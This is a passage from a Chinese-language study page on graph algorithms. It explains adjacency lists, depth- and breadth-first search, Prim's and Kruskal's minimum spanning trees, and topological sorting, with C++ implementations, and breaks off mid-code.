i,j,k;</span><br><span class="line">    ArcNode *s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;G.vexnum,&amp;G.arcnum,&amp;G.kind);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        cin&gt;&gt;G.vertices[i].data.id;</span><br><span class="line">        G.vertices[i].firstarc=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G.arcnum;k++)&#123;</span><br><span class="line">        cin&gt;&gt;i&gt;&gt;j;</span><br><span class="line">        s=(ArcNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ArcNode));</span><br><span class="line">        s-&gt;adjvex=j;</span><br><span class="line">        s-&gt;info=<span class="literal">NULL</span>;</span><br><span class="line">        s-&gt;nextarc=G.vertices[i].firstarc;</span><br><span class="line">        G.vertices[i].firstarc=s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h5><p>1.空间复杂度O(n+e)</p><p>2.容易找到任意一个顶点的第一个邻接点</p><h3 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h3><p>图的遍历指，从图的某一顶点出发，访问图中所有顶点，且每个顶点仅访问一次</p><h4 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h4><h5 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h5><p>1.首先访问图中某一个顶点$V_1$，以该点为出发点</p><p>2.任选一个与顶点$V_i$邻接的未被访问的顶点$V_j$，访问$V_j$</p><p>3.以$V_j$为新的出发点继续进行深度优先搜索</p><h5 id="算法概要"><a href="#算法概要" class="headerlink" title="算法概要"></a>算法概要</h5><p>输入：图G，初始访问顶点v;</p><p>输出：图G的深度优先搜索序列；</p><p>1.访问v</p><p>2.改变v的访问标志</p><p>3.任选一个与v相邻又没被访问的顶点w</p><p>4.从w开始继续进行深度优先搜索</p><p>算法实现：</p><p>这里用邻接矩阵实现算法，传入的visit[]数组全部置0</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(MGraph G, <span class="type">int</span> v, <span class="type">bool</span> visited[])</span> </span>&#123;</span><br><span class="line">    visited[v] = TRUE;</span><br><span class="line">    cout &lt;&lt; G.vexs[v].id;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> w = <span class="number">0</span>; w &lt; G.vexnum; w++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (G.arcs[v][w].adj != <span class="number">-1</span> &amp;&amp; !visited[w]) &#123;</span><br><span class="line">            <span class="built_in">DFS</span>(G, w, visited);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h4><h5 id="基本思想-1"><a href="#基本思想-1" class="headerlink" title="基本思想"></a>基本思想</h5><p>1.首先访问图中某一个指定的出发点$v_i$,</p><p>2.然后一次访问$v_i$的所有邻接点$v_{i1}$,$v_{i2}$,$v_{i3}$…</p><p>3.再依次以$v_{i1}$,$v_{i2}$,$v_{i3}$…为顶点访问各顶点未被访问的邻接点，依次类推，直到图中所有顶点均被访问</p><h5 id="算法概要-1"><a href="#算法概要-1" class="headerlink" title="算法概要"></a>算法概要</h5><p>输入：图G，初始访问结点v</p><p>输出：图G的广度优先搜索序列</p><p>1.设置辅助队列Q，访问节点v，修改v的标志，v入队列</p><p>2.while(队列非空){</p><p>​    出队列节点u</p><p>​    访问与u的所有节点</p><p>​    修改与u邻接的所有结点的标志，与u邻接的所有结点入队列</p><p>}</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">QNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">QNode</span> *next;</span><br><span class="line">&#125;QNode,*QueuePtr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    QueuePtr front;</span><br><span class="line">    QueuePtr rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Q.front=Q.rear=(QNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!Q.front)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnQueue</span><span class="params">(LinkQueue &amp;Q,<span class="type">int</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QueuePtr p=(QNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(QNode));</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear-&gt;next=p;</span><br><span class="line">    Q.rear=p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeQueue</span><span class="params">(LinkQueue &amp;Q,<span class="type">int</span> &amp;e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==Q.front)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        QueuePtr p;</span><br><span class="line">        p=Q.front-&gt;next;</span><br><span class="line">        e=p-&gt;data;</span><br><span class="line">        Q.front-&gt;next=Q.front-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">            Q.rear=Q.front;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueEmpty</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">LinkQueue Q;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BFSTraVErse</span><span class="params">(ALGraph G,<span class="type">bool</span> visit[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> v;</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        visit[v]=FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">InitQueue</span>(Q);</span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visit[v])&#123;</span><br><span class="line">            visit[v]=TRUE;</span><br><span class="line">            cout&lt;&lt;G.vertices[v].data.id;</span><br><span class="line">            <span class="built_in">EnQueue</span>(Q, v);</span><br><span class="line">            <span class="keyword">while</span>(!<span class="built_in">QueueEmpty</span>(Q))&#123;</span><br><span class="line">                <span class="type">int</span> u,w;</span><br><span class="line">                ArcNode *p;</span><br><span class="line">                <span class="built_in">DeQueue</span>(Q, u);</span><br><span class="line">                <span class="keyword">for</span>(p=G.vertices[u].firstarc;p!=<span class="literal">NULL</span>;p=p-&gt;nextarc)<span class="comment">//将取出的u结点遍历</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(!visit[p-&gt;adjvex])</span><br><span class="line">                    &#123;</span><br><span class="line">                        w=p-&gt;adjvex;</span><br><span class="line">                        visit[w]=TRUE;</span><br><span class="line">                        <span class="built_in">EnQueue</span>(Q,w);</span><br><span class="line">                        cout&lt;&lt;G.vertices[w].data.id;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图的连通性问题"><a href="#图的连通性问题" class="headerlink" title="图的连通性问题"></a>图的连通性问题</h3><h4 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h4><p>prim算法</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//该图输入为字符型顶点，权值为浮点数且不为0</span></span><br><span class="line"><span class="comment">//部分注释代码为调试函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcCell</span>&#123;</span><br><span class="line">    <span class="type">float</span> adj;      <span class="comment">//记录权值</span></span><br><span class="line">&#125;ArcCell,G[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">    <span class="type">char</span> begin;</span><br><span class="line">    <span class="type">char</span> end;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    G arcs;</span><br><span class="line">    <span class="type">int</span> vexnum,arcsnum;</span><br><span class="line">    <span class="type">char</span> vex[MAX_VERTEX_NUM];</span><br><span class="line">    Edge edge[MAX_VERTEX_NUM];</span><br><span class="line">&#125;MGraph;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">V</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex;<span class="comment">//closedeg[i].adjvex记录的是，顶点i到U中最短边的点</span></span><br><span class="line">    <span class="type">float</span> lowcost;<span class="comment">//lowcost记录权值</span></span><br><span class="line">&#125;;</span><br><span class="line">V closedge[MAX_VERTEX_NUM];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Locatevex</span><span class="params">(MGraph G,<span class="type">char</span> u)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(G.vex[i]==u)&#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateGraph</span><span class="params">(MGraph &amp;G)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    <span class="type">char</span> name;</span><br><span class="line">    <span class="type">float</span> w;</span><br><span class="line">    <span class="type">char</span> ii, jj;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;G.vexnum,&amp;G.arcsnum);<span class="comment">//输入顶点数和弧数</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">       <span class="comment">// cout&lt;&lt;&quot;input name:&quot;;</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;name);  <span class="comment">//输入顶点名称，按次存储在vex[]数组中，下标从0开始</span></span><br><span class="line">        G.vex[i]=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            G.arcs[i][j].adj=<span class="number">100</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.arcsnum;i++)&#123;</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c %c %f&quot;</span>,&amp;ii,&amp;jj,&amp;w);</span><br><span class="line">        j=<span class="built_in">Locatevex</span>(G, ii);</span><br><span class="line">        k=<span class="built_in">Locatevex</span>(G, jj);</span><br><span class="line">        G.arcs[j][k].adj=w;</span><br><span class="line">        G.arcs[k][j].adj=w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showMatrix</span><span class="params">(MGraph G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            cout&lt;&lt;G.arcs[i][j].adj&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MiniSpanTree_P</span><span class="params">(MGraph G,<span class="type">char</span> u)</span></span>&#123;</span><br><span class="line">   <span class="comment">// getchar();</span></span><br><span class="line">    V closedge[G.vexnum];</span><br><span class="line">    <span class="type">int</span> t=<span class="built_in">Locatevex</span>(G,u);</span><br><span class="line">    <span class="type">int</span> i,j,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j!=t)&#123;</span><br><span class="line">            closedge[j]=&#123;t,G.arcs[t][j].adj&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        closedge[t].lowcost=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="comment">/*for(int c=0;c&lt;G.vexnum;c++)&#123;</span></span><br><span class="line"><span class="comment">            cout&lt;&lt;closedge[c].adjvex&lt;&lt;&quot; &quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        for(int c=0;c&lt;G.vexnum;c++)&#123;</span></span><br><span class="line"><span class="comment">            cout&lt;&lt;closedge[c].lowcost&lt;&lt;&quot; &quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;endl;*/</span></span><br><span class="line">        <span class="type">float</span> temp=<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;            <span class="comment">//求k closedge最小值</span></span><br><span class="line">            <span class="keyword">if</span>(closedge[j].lowcost==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(closedge[j].lowcost&lt;temp)&#123;</span><br><span class="line">                    k=j;</span><br><span class="line">                    temp=closedge[j].lowcost;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// cout&lt;&lt;k&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,G.vex[closedge[k].adjvex]);</span><br><span class="line">        <span class="keyword">if</span>(i==G.vexnum<span class="number">-1</span>)&#123;</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        closedge[k].lowcost=<span class="number">0</span>;</span><br><span class="line">        t=k;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!closedge[j].lowcost)&#123;</span><br><span class="line">                closedge[j].adjvex=t;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                closedge[j].adjvex=t;</span><br><span class="line">                closedge[j].lowcost=G.arcs[t][j].adj;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    MGraph G;</span><br><span class="line">    <span class="built_in">CreateGraph</span>(G);</span><br><span class="line">    <span class="built_in">showMatrix</span>(G);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;===============&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="type">char</span> index;</span><br><span class="line">    cin&gt;&gt;index;</span><br><span class="line">    <span class="built_in">MiniSpanTree_P</span>(G, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kruskal算法</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> src, dest;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 寻找父节点</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">findParent</span><span class="params">(<span class="type">int</span> parent[], <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (parent[i] == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">findParent</span>(parent, parent[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并两个子树</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unionSets</span><span class="params">(<span class="type">int</span> parent[], <span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> xset = <span class="built_in">findParent</span>(parent, x);</span><br><span class="line">    <span class="type">int</span> yset = <span class="built_in">findParent</span>(parent, y);</span><br><span class="line">    parent[xset] = yset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kruskalMST</span><span class="params">(<span class="type">int</span> V, Edge edges[], <span class="type">int</span> E)</span> </span>&#123;</span><br><span class="line">    Edge result[V - <span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>; <span class="comment">// 用于结果数组的索引</span></span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>; <span class="comment">// 用于排序边的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对边按权重进行排序</span></span><br><span class="line">    <span class="built_in">sort</span>(edges, edges + E, [](Edge a, Edge b) &#123;</span><br><span class="line">        <span class="keyword">return</span> a.weight &lt; b.weight;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> parent[V]; <span class="comment">// 用于检测环路</span></span><br><span class="line">    <span class="built_in">fill</span>(parent, parent + V, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; V - <span class="number">1</span> &amp;&amp; e &lt; E) &#123;</span><br><span class="line">        Edge nextEdge = edges[e++];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> x = <span class="built_in">findParent</span>(parent, nextEdge.src);</span><br><span class="line">        <span class="type">int</span> y = <span class="built_in">findParent</span>(parent, nextEdge.dest);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x != y) &#123;</span><br><span class="line">            result[i++] = nextEdge;</span><br><span class="line">            <span class="built_in">unionSets</span>(parent, x, y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出最小生成树的边和权重</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Edges in the Minimum Spanning Tree:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; V - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        cout &lt;&lt; result[i].src &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; result[i].dest &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; result[i].weight &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> V = <span class="number">4</span>; <span class="comment">// 顶点数</span></span><br><span class="line">    <span class="type">int</span> E = <span class="number">5</span>; <span class="comment">// 边数</span></span><br><span class="line">    Edge edges[] = &#123;</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>&#125;,</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>&#125;,</span><br><span class="line">        &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行Kruskal算法并输出结果</span></span><br><span class="line">    <span class="built_in">kruskalMST</span>(V, edges, E);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="有向无环图的应用"><a href="#有向无环图的应用" class="headerlink" title="有向无环图的应用"></a>有向无环图的应用</h3><p>有向无环图简称DAG图</p><p>DAG图在工程计划和管理方面应用广泛。</p><h4 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h4><h5 id="基本定义和特点"><a href="#基本定义和特点" class="headerlink" title="基本定义和特点"></a>基本定义和特点</h5><p>顶点活动网：AOV网，将顶点表示活动，边表示活动之间的关系</p><p>拓扑序列：把AOV网中的所有顶点排成可以线性序列，该序列满足：若AOV网中存在从$v_i$到$v_j$的路径，则在该序列中，$v_i$必位于$v_j$之前</p><p>拓扑排序：构造AOV网的拓扑序列的操作被称为拓扑排序</p><p>特点：</p><p>1.一个有向图的拓扑序列不一定唯一</p><p>2.有向无环图一定存在拓扑序列</p><p>3.有向有环图不存在拓扑序列</p><p>4.可以通过构造拓扑序列，判断AOV网是否存在环</p><h5 id="拓扑排序算法的基本思想"><a href="#拓扑排序算法的基本思想" class="headerlink" title="拓扑排序算法的基本思想"></a>拓扑排序算法的基本思想</h5><p>1.在有向图中选一个入度为0的顶点输出</p><p>2。从图中删除该顶点及所有它的出边</p><p>3.重复 1和2 直到所有顶点输出或者图中剩余顶点入度均不为0（此时图中有回路，无法拓扑排序）</p><h5 id="算法概要-2"><a href="#算法概要-2" class="headerlink" title="算法概要"></a>算法概要</h5><p>增加一个存放各顶点入度的数组indegree[]</p><p>1.扫描indegree[]，将入度为0的顶点入栈</p><p>2.while(栈非空){</p><p>​    出栈顶元素$v_i$，并输出；</p><p>​    检查$v_i$的出边表，将每条出边&lt;$v_i$,$v_j$&gt;的终点$v_j$的入度减1，若vj的入度减至0，v$v_j$入栈；</p><p>}</p><p>3.若输出的顶点数小于n则有回路（无法拓扑排序），否则正常结束。</p><p>算法实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;DG,DN,UDG,UDN&#125;GraphKind;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">InfoType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">&#125;InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vertextype</span>&#123;</span><br><span class="line">    <span class="type">char</span> id;</span><br><span class="line">    <span class="type">int</span> No;</span><br><span class="line"> <span class="comment">//   string label;</span></span><br><span class="line">&#125;vertextype;</span><br><span class="line"><span class="comment">//边表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex; <span class="comment">//该弧指向的顶点位置</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ArcNode</span> *nextarc;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;ArcNode;</span><br><span class="line"><span class="comment">//顶点表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vnode</span>&#123;</span><br><span class="line">    vertextype data;</span><br><span class="line">    ArcNode *firstarc;</span><br><span class="line">&#125;vnode,adjlist[MAX_VERTEX_NUM];</span><br><span class="line"><span class="comment">//邻接表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    adjlist vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">    GraphKind kind;</span><br><span class="line">&#125;ALGraph;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Creatadilist</span><span class="params">(ALGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    ArcNode *s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;G.vexnum,&amp;G.arcnum,&amp;G.kind);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        cin&gt;&gt;G.vertices[i].data.id;</span><br><span class="line">        G.vertices[i].firstarc=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G.arcnum;k++)&#123;</span><br><span class="line">        cin&gt;&gt;i&gt;&gt;j;</span><br><span class="line">        s=(ArcNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ArcNode));</span><br><span class="line">        s-&gt;adjvex=j;</span><br><span class="line">        s-&gt;info=<span class="literal">NULL</span>;</span><br><span class="line">        s-&gt;nextarc=G.vertices[i].firstarc;</span><br><span class="line">        G.vertices[i].firstarc=s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SElemType</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    <span class="type">int</span> *base;</span><br><span class="line">    <span class="type">int</span> *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    S.base=(<span class="type">int</span>*)<span class="built_in">malloc</span>(STACK_INIT_SIZE*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span>(!S.base) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    S.top=S.base;</span><br><span class="line">    